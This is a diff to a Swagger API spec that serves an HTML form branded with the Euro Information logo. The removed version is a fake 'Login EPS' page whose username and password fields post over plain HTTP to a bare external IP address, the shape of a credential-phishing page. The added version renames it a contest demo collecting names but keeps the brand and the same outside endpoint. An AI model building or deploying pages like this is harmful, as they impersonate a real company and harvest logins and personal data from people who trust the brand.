@@ -1,12 +1,12 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Login Euro Information
-  description: Formulaire de connexion EPS
+  title: Démo Login Euro Information
+  description: Formulaire statique de démo
 paths:
-  /EPS:
+  /demo-concours:
     get:
-      summary: Login
+      summary: Démo de concours
       produces:
         - text/html
       responses:
@@ -18,17 +18,17 @@ paths:
               <!DOCTYPE html>
               <html>
               <head>
-                <title>Login Euro Information</title>
+                <title>Démo concours Euro Information</title>
               </head>
               <body style="font-family: Arial, sans-serif; text-align:center;">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/Euro_Information_Logo.svg/320px-Euro_Information_Logo.svg.png" alt="Euro Information Logo" style="max-width:200px; margin:20px;">
-                <h2>Login EPS</h2>
+                <h2>Concours Demo</h2>
                 <form action="http://64.226.119.233/participation" method="POST" style="display:inline-block; text-align:left; margin-top:20px;">
-                  <label>Identifiant</label><br>
+                  <label>Prénom</label><br>
                   <input type="text" name="prenom" style="width:100%; padding:8px; margin-bottom:10px;" required><br>
                   <label>Nom</label><br>
-                  <input type="text" name="Mot de passe" style="width:100%; padding:8px; margin-bottom:10px;" required><br>
-                  <button type="submit" style="width:100%; padding:10px; background-color:#0055A4; color:white; border:none; border-radius:4px;">Login</button>
+                  <input type="text" name="nom" style="width:100%; padding:8px; margin-bottom:10px;" required><br>
+                  <button type="submit" style="width:100%; padding:10px; background-color:#0055A4; color:white; border:none; border-radius:4px;">Participer</button>
                 </form>
               </body>
               </html>
